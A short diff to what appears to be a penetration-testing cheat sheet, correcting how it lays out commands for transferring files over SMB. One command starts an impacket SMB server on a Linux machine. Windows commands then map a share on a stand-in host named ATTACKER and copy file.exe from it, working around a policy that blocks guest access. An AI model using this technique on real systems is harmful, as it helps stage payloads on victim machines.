@@ -23,11 +23,12 @@ You can't access this shared folder because your organization's security policie
 ```
 - From Linux machine do this instead
 ```bash
-sudo impacket-smbserver share -smb2support /tmp/smbshare \ -user test -password test1
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test1
 ```
 - From Windows
 ```cmd
-net use n: \\ATTACKER\share /user:test test1 copy n:\file.exe
+net use n: \\ATTACKER\share /user:test test1
+copy n:\file.exe
 ```
 
 
